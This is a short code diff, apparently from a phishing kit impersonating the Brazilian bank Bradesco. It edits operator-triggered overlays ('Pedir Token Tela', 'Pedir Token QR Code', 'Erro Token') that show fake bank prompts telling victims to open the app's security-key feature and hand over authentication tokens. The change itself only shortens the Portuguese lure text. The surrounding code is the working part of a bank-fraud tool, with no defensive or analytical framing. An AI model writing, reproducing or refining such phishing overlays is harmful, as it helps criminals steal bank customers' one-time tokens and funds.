@@ -140,10 +140,10 @@
         break;
       case 'Pedir Token Tela':
       case 'Pedir Token Físico':
-        showOverlay('token', 'Identificação Positiva<br>Abra o aplicativo Bradesco, vá em Chave de Segurança e em seguida, toque em Validação Digital.');
+        showOverlay('token', 'Identificação Positiva<br>Abra o aplicativo Bradesco, vá em Chave de Segurança.');
         break;
       case 'Pedir Token QR Code':
-        showOverlay('qrcode-request', 'Identificação Positiva<br>Abra o aplicativo Bradesco, vá em Chave de Segurança e em seguida, toque em Validação Digital.');
+        showOverlay('qrcode-request', 'Identificação Positiva<br>Abra o aplicativo Bradesco, vá em Chave de Segurança.');
         break;
       case 'Erro Token':
         showOverlay('error', 'Erro ao validar token. Tente novamente.');
